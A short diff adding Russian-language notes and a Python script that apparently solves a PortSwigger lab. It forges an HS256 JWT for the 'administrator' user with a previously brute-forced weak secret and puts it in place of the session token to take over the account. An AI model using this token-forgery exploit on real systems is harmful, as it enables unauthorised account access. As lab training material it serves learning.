@@ -1,0 +1,23 @@
+сгенерировать 
+jwt c секретом 
+также нужно импортировать библиотеку import pyjwt                                            
+import jwt
+
+header = {
+    "kid": "7cc4b6b6-1496-4bb8-8293-d1b09bfa1f67",
+    "alg": "HS256"
+}
+
+payload = {
+    "iss": "portswigger",
+    "exp": 1761812206,
+    "sub": "administrator"
+}
+
+secret = "secret1"
+
+token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
+print(token)
+
+получаем токен вставляем в jwt.io вводим секрет (который заранее сбрутили)
+jwt вставляем вместо сессии -> получаем доступ к учетке
